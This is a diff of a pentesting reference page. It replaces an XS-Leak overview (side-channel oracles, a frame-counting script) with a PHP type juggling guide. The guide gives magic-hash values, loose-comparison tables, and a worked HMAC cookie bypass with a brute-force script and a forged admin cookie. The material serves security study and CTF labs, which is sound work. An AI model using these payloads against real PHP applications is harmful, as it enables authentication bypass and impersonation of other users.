@@ -1,129 +1,160 @@
-# XS-Leak
+# Type Juggling
 
-> Cross-Site Leaks (XS-Leaks) are side-channel vulnerabilities allowing attackers to infer sensitive information from a target origin without reading the response body. They exploit browser behaviors, timing differences, and observable side effects rather than traditional XSS data exfiltration.
+> PHP is a loosely typed language, which means it tries to predict the programmer's intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the '==' operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).
 
 ## Summary
 
-* [Tools](#tools)
+* [Loose Comparison](#loose-comparison)
+    * [True Statements](#true-statements)
+    * [NULL Statements](#null-statements)
+    * [Loose Comparison](#loose-comparison)
+* [Magic Hashes](#magic-hashes)
 * [Methodology](#methodology)
-    * [Attack Primitives](#attack-primitives)
-    * [XS-Search](#xs-search)
-* [Cross-site Oracles](#cross-site-oracles)
-    * [Timing Attacks](#timing-attacks)
-    * [Frame Counting](#frame-counting)
-    * [Cache Probing](#cache-probing)
-    * [Known Oracles](#known-oracles)
 * [Labs](#labs)
 * [References](#references)
 
-## Tools
+## Loose Comparison
 
-* [RUB-NDS/xsinator.com](https://github.com/RUB-NDS/xsinator.com) - XS-Leak Browser Test Suite.
-* [RUB-NDS/AutoLeak](https://github.com/RUB-NDS/AutoLeak) - Find XS-Leaks in the browser by diffing DOM-Graphs in two states.
+> PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.
+
+* **Loose** comparison: using `== or !=` : both variables have "the same value".
+* **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".
+
+### True Statements
+
+| Statement                       | Output                           |
+| ------------------------------- | :------------------------------: |
+| `'0010e2'   == '1e3'`           | true                             |
+| `'0xABCdef' == ' 0xABCdef'`     | true (PHP 5.0) / false (PHP 7.0) |
+| `'0xABCdef' == '     0xABCdef'` | true (PHP 5.0) / false (PHP 7.0) |
+| `'0x01'     == 1`               | true (PHP 5.0) / false (PHP 7.0) |
+| `'0x1234Ab' == '1193131'`       | true (PHP 5.0) / false (PHP 7.0) |
+| `'123'  == 123`                 | true                             |
+| `'123a' == 123`                 | true                             |
+| `'abc'  == 0`                   | true                             |
+| `'' == 0 == false == NULL`      | true                             |
+| `'' == 0`                       | true                             |
+| `0  == false`                   | true                             |
+| `false == NULL`                 | true                             |
+| `NULL == ''`                    | true                             |
+
+> PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead.
+
+![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)
+
+Loose Type comparisons occurs in many languages:
+
+* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
+* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
+* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
+* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
+* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
+* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
+* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
+* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)
+
+### NULL Statements
+
+| Function | Statement             | Output |
+| -------- | --------------------- | :----: |
+| sha1     | `var_dump(sha1([]));` | NULL   |
+| md5      | `var_dump(md5([]));`  | NULL   |
+
+## Magic Hashes
+
+> Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations.
+
+| Hash | "Magic" Number / String                 | Magic Hash                       | Found By / Description                                                  |
+| ---- | --------------------------------------- | -------------------------------- | ----------------------------------------------------------------------- |
+| MD4  | gH0nAdHk                                | 0e096229559581069251163783434175 | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md)            |
+| MD4  | IiF+hTai                                | 00e90130237707355082822449868597 | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md)            |
+| MD5  | 240610708                               | 0e462097431906509019562988736854 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
+| MD5  | QNKCDZO                                 | 0e830400451993494058024219903391 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
+| MD5  | 0e1137126905                            | 0e291659922323405260514745084877 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
+| MD5  | 0e215962017                             | 0e291242476940776845150308577824 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
+| MD5  | 129581926211651571912466741651878684928 | 06da5430449f8f6f23dfc1276f722738 | Raw: ?T0D??o#??'or'8.N=?                                                |
+
+| Hash    | "Magic" Number / String | Magic Hash                                                       | Found By / Description                                                           |
+| ------- | ----------------------- | ---------------------------------------------------------------- | -------------------------------------------------------------------------------- |
+| SHA1    | 10932435112             | 0e07766915004133176347055865026311692244                         | Michael A. Cleverly, Michele Spagnuolo & Rogdham                                 |
+| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636         | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
+| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
+| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083)   |
+
+```php
+<?php
+var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
+var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
+var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
+var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
+?>
+```
 
 ## Methodology
 
-### Attack Primitives
+The vulnerability in the following code lies in the use of a loose comparison (!=) to validate the $cookie['hmac'] against the calculated `$hash`.
 
-Unlike classic CORS or XSS attacks, XS-Leaks rely on observable browser behavior:
-
-| Primitive   | Leaks                      |
-| ----------- | -------------------------- |
-| Timing      | Resource size / complexity |
-| Frame count | Content differences        |
-| Errors      | Access control decisions   |
-| Cache       | Previous visits            |
-| Navigation  | Auth state                 |
-| Rendering   | Text length                |
-
-### XS-Search
-
-XS-Search attacks abuse Query-Based Search Systems to leak user information. By measuring the side effects of a search query (e.g., response time, frame count, or error events), an attacker can infer whether a search returned results or not. This boolean oracle can be used to brute-force sensitive data character by character.
-
-**Examples**:
-
-* Opening 50 tabs and use the timing difference from an iframe CSP violation in the search results page to bruteforce the flag character by character.
-
-## Cross-site Oracles
-
-### Timing Attacks
-
-In a timing attack, an attacker seeks to uncover sensitive information by observing how long a system takes to respond to particular requests. They deploy carefully designed scripts to the target application to execute API calls, send AJAX requests, or initiate cross-origin resource sharing (CORS) interactions. By measuring and comparing the response times of these operations, the attacker can deduce insights about the system’s internal behavior, data validation processes, or underlying security controls.
-
-### Frame Counting
-
-If a page loads different numbers of iframes based on the user's state (e.g., search results), an attacker can count them to infer data.
-
-```js
-// Get a reference to the window
-var win = window.open('https://example.org');
-
-// Wait for the page to load
-setTimeout(() => {
-  // Read the number of iframes loaded
-  console.log("%d iframes detected", win.length);
-}, 2000);
+```php
+function validate_cookie($cookie,$key){
+ $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
+ if($cookie['hmac'] != $hash){ // loose comparison
+  return false;
+  
+ }
+ else{
+  echo "Well done";
+ }
+}
 ```
 
-### Cache Probing
+In this case, if an attacker can control the $cookie['hmac'] value and set it to a string like "0", and somehow manipulate the hash_hmac function to return a hash that starts with "0e" followed only by numbers (which is interpreted as zero), the condition $cookie['hmac'] != $hash would evaluate to false, effectively bypassing the HMAC check.
 
-In a cache probing attack, a malicious website attempts to determine whether a specific resource from a target site is already stored in the victim’s browser cache. The attacker causes the browser to request a resource (for example, an image, script, or endpoint) that may only be cached if the user is authenticated or has previously visited a particular page. By measuring how quickly the resource loads, or by observing differences in behavior between a cached and non-cached response, the attacker can infer sensitive information.
+We have control over 3 elements in the cookie:
 
-### Known Oracles
+* `$username` - username you are targeting, probably "admin"
+* `$expiration` - a UNIX timestamp, must be in the future
+* `$hmac` - the provided hash, "0"
 
-* [Cache Leak (CORS)](https://xsinator.com/testing.html#Cache%20Leak%20(CORS)) - Detect resources loaded by page. Cache is deleted with CORS error.
-* [Cache Leak (POST)](https://xsinator.com/testing.html#Cache%20Leak%20(POST)) - Detect resources loaded by page. Cache is deleted with a POST request.
-* [ContentDocument X-Frame Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak) - Detect X-Frame-Options with ContentDocument.
-* [COOP Leak](https://xsinator.com/testing.html#COOP%20Leak) - Detect Cross-Origin-Opener-Policy header with popup.
-* [CORB Leak](https://xsinator.com/testing.html#CORB%20Leak) - Detect X-Content-Type-Options in combination with specific content type using CORB.
-* [CORP Leak](https://xsinator.com/testing.html#CORP%20Leak) - Detect Cross-Origin-Resource-Policy header with fetch.
-* [CORS Error Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak) - Leak redirect target URL with CORS error.
-* [CSP Directive Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak) - Detect CSP directives with CSP iframe attribute.
-* [CSP Redirect Detection](https://xsinator.com/testing.html#CSP%20Redirect%20Detection) - Detect cross-origin redirects with CSP violation event.
-* [CSP Violation Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak) - Leak cross-origin redirect target with CSP violation event.
-* [CSS Property Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak) - Leak CSS rules with getComputedStyle.
-* [Disk cache grooming](https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622)
-* [Download Detection](https://xsinator.com/testing.html#Download%20Detection) - Detect downloads (Content-Disposition header).
-* [Duration Redirect Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak) - Detect cross-origin redirects by checking the duration.
-* [ETag header length](https://blog.arkark.dev/2025/12/26/etag-length-leak) - Detect response body size with ETag header length
-* [Event Handler Leak (Object)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Object)) - Detect errors with onload/onerror with object.
-* [Event Handler Leak (Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)) - Detect errors with onload/onerror with script.
-* [Event Handler Leak (Stylesheet)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Stylesheet)) - Detect errors with onload/onerror with stylesheet.
-* [Fetch Redirect Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak) - Detect HTTP redirects with Fetch API.
-* [Frame Count Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak) - Detect the number of iframes on a page.
-* [History Length Leak](https://xsinator.com/testing.html#History%20Length%20Leak) - Detect javascript redirects with History API.
-* [Id Attribute Leak](https://xsinator.com/testing.html#Id%20Attribute%20Leak) - Leak id attribute of focusable HTML elements with onblur.
-* [Max Redirect Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak) - Detect server redirect by abusing max redirect limit.
-* [Media Dimensions Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak) - Leak dimensions of images or videos.
-* [Media Duration Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak) - Leak duration of audio or videos.
-* [MediaError Leak](https://xsinator.com/testing.html#MediaError%20Leak) - Detect status codes with MediaError message.
-* [Payment API Leak](https://xsinator.com/testing.html#Payment%20API%20Leak) - Detect if another tab is using the Payment API.
-* [Performance API CORP Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak) - Detect Cross-Origin-Resource-Policy header with Performance API.
-* [Performance API Download Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection) - Detect downloads (Content-Disposition header) with Performance API.
-* [Performance API Empty Page Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak) - Detect empty responses with Performance API.
-* [Performance API Error Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak) - Detect errors with Performance API.
-* [Performance API X-Frame Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak) - Detect X-Frame-Options with Performance API.
-* [Performance API XSS Auditor Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak) - Detect scripts/event handlers in a page with Performance API.
-* [Redirect Start Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak) - Detect cross-origin HTTP redirects by checking redirectStart time.
-* [Request Merging Error Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) - Detect errors with request merging.
-* [SRI Error Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak) - Leak content length with SRI error.
-* [Style Reload Error Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak) - Detect errors with style reload bug.
-* [URL Max Length Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak) - Detect server redirect by abusing URL max length.
-* [WebSocket Leak (FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)) - Detect the number of websockets on a page by exausting the socket limit.
-* [WebSocket Leak (GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)) - Detect the number of websockets on a page by exausting the socket limit.
+The exploitation phase is the following:
+
+* Prepare a malicious cookie: The attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), `$expiration` set to a future UNIX timestamp, and $hmac set to "0".
+* Brute force the `$expiration` value: The attacker then brute forces different `$expiration` values until the hash_hmac function generates a hash that starts with "0e" and is followed only by numbers. This is a computationally intensive process and might not be feasible depending on the system setup. However, if successful, this step would generate a "zero-like" hash.
+
+ ```php
+ // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
+ for($i=1424869663; $i < 1835970773; $i++ ){
+  $out = hash_hmac('md5', 'admin|'.$i, '');
+  if(str_starts_with($out, '0e' )){
+   if($out == 0){
+    echo "$i - ".$out;
+    break;
+   }
+  }
+ }
+ ?>
+ ```
+
+* Update the cookie data with the value from the bruteforce: `1539805986 - 0e772967136366835494939987377058`
+
+ ```php
+ $cookie = [
+  'username' => 'admin',
+  'expiration' => 1539805986,
+  'hmac' => '0'
+ ];
+ ```
+
+* In this case we assumed the key was a null string : `$key = '';`
 
 ## Labs
 
-* [Root Me - XS Leaks](https://www.root-me.org/en/Challenges/Web-Client/XS-Leaks)
+* [Root Me - PHP - Type Juggling](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
+* [Root Me - PHP - Loose Comparison](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)
 
 ## References
 
-* [2025 SECCON CTF 14 Quals Web Challenges Writeup - RewriteLab - December 31, 2025](https://research.rewritelab.org/2025/12/31/%5BENG%5D%202025%20SECCON%20CTF%2014%20Quals%20Web%20Challenges%20Writeup/)
-* [ASIS CTF Finals 2024 - arkark - December 30, 2024](https://blog.arkark.dev/2024/12/30/asisctf-finals#web-fire-leak)
-* [Cross-Site ETag Length Leak - Takeshi Kaneko - December 26, 2025](https://web.archive.org/web/20260116095358/https://blog.arkark.dev/2025/12/26/etag-length-leak)
-* [Exfiltration of secrets using an XS-Leaks - HackTM Secrets - xanhacks - February 19, 2023](https://web.archive.org/web/20230323083337/https://xanhacks.xyz/p/secrets-hacktmctf/)
-* [Impossible Leak - SECCON 2025 Quals - parrot409 - December 14, 2025](https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622)
-* [justCTF 2022 - Baby XSLeak Write-up - aszx87410 - June 14, 2022](https://web.archive.org/web/20240816003707/https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)
-* [Secret Note Keeper (xs-leaks) Facebook CTF 2019 - Abdillah Muhamad - July 3, 2019](https://web.archive.org/web/20241214153926/https://abdilahrf.github.io/ctf/writeup-secret-note-keeper-fbctf-2019)
-* [SekaiCTF 2023 - Leakless Note - Kalmarunionen - September 5, 2023](https://web.archive.org/web/20230923073547/https://www.kalmarunionen.dk/writeups/2023/sekai/leakless-notes/)
-* [XS-Leak: Leaking IDs using focus - Gareth Heyes - October 8, 2019](https://web.archive.org/web/20251126101114/https://portswigger.net/research/xs-leak-leaking-ids-using-focus)
+* [(Super) Magic Hashes - myst404 (@myst404_) - October 7, 2019](https://web.archive.org/web/20191113170442/https://offsec.almond.consulting/super-magic-hash.html)
+* [Magic Hashes - Robert Hansen - May 11, 2015](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
+* [Magic hashes – PHP hash "collisions" - Michal Špaček (@spaze) - May 6, 2015](https://github.com/spaze/hashes)
+* [PHP Magic Tricks: Type Juggling - Chris Smith (@chrismsnz) - August 18, 2020](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+* [Writing Exploits For Exotic Bug Classes: PHP Type Juggling - Tyler Borland (TurboBorland) - August 17, 2013](https://web.archive.org/web/20131129232245/http://turbochaos.blogspot.com:80/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
